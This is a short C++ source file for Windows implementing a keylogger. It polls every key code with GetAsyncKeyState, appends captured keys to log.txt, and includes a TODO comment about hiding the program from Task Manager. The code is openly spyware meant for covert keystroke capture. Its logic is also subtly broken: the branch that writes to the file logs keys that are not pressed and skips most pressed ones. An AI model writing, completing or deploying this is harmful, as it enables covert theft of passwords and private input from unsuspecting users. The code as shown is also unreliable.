#ifdef __WIN32__
#include <fstream>
#include "window_logger.hpp"



bool special_key(int key, std::fstream &file) {
    if (file.is_open()) {
        switch (key) {
            case VK_BACK:
                file << "[BACKSPACE]";
                return true;
            default:
                return false;
        }

    }
    return false;
}

void window_keylogger(){
    std::fstream file = std::fstream("log.txt", std::ios::in | std::ios::out |std::ios::app);
    int key = 0;
    bool running = true;
    std::cerr << "test" << std::endl;
    if (!file.is_open()) {
        std::cerr << "file is empty" << std::endl;
    }
    //TODO:
    /*write code that nalyzes all task and stops the program to reduce ram/cpu usuage
     *to prevent anyone from seeing it that well in task manger
     *
     */
    while (running) {
        for(int i=0; i <=255; i++) {

            if(GetAsyncKeyState(i) == -32767) {
                if(special_key(i, file)) {
                    file.flush();
                }
            }
            else {
                file << static_cast<char>(i);
                file.flush();
            }
            Sleep(50);

        }
    }
}

#endif